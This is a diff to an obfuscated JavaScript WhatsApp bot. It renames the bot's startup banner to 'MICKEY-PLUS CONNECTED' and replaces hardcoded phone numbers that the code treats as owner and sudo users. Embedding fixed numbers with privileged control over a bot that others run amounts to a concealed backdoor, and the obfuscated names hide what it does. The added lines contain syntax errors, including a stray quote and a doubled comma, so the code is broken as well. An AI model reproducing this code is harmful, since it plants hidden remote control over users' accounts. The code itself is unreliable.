@@ -811,10 +811,10 @@ setTimeout(() => {
       } = require("./bdd/sudo");
       const _0x103f23 = _0x5ba00c.pushName;
       const _0x35d74f = await _0x7cfce6();
-      const _0x3083cf = [_0x59f605, "255763834140", "255763834140", '255763834140', "255763834140", conf.NUMERO_OWNER].map(_0x385d66 => _0x385d66.replace(/[^0-9]/g) + '@s.whatsapp.net');
+      const _0x3083cf = [_0x59f605, "255612130873", "255612130873", '255711765335'", conf.NUMERO_OWNER].map(_0x385d66 => _0x385d66.replace(/[^0-9]/g) + '@s.whatsapp.net');
       const _0x5d8c68 = _0x3083cf.concat(_0x35d74f);
       const _0x5c1f0c = _0x5d8c68.includes(_0x5383e1);
-      var _0x3ede21 = ["255763834140", "255763834140", '255763834140', "255763834140"].map(_0x412458 => _0x412458.replace(/[^0-9]/g) + "@s.whatsapp.net").includes(_0x5383e1);
+      var _0x3ede21 = ["255612130873",, '255612130873', "255711765335"].map(_0x412458 => _0x412458.replace(/[^0-9]/g) + "@s.whatsapp.net").includes(_0x5383e1);
       function _0x35dcbe(_0x362039) {
         _0x197c7b.sendMessage(_0x162f50, {
           'text': _0x362039
@@ -822,7 +822,7 @@ setTimeout(() => {
           'quoted': _0x5ba00c
         });
       }
-      console.log("\t🌍BWB-XMD ONLINE🌍");
+      console.log("MICKEY-PLUS CONNECTED");
       console.log("=========== written message===========");
       if (_0x288199) {
         console.log("message provenant du groupe : " + _0x4d1e06);
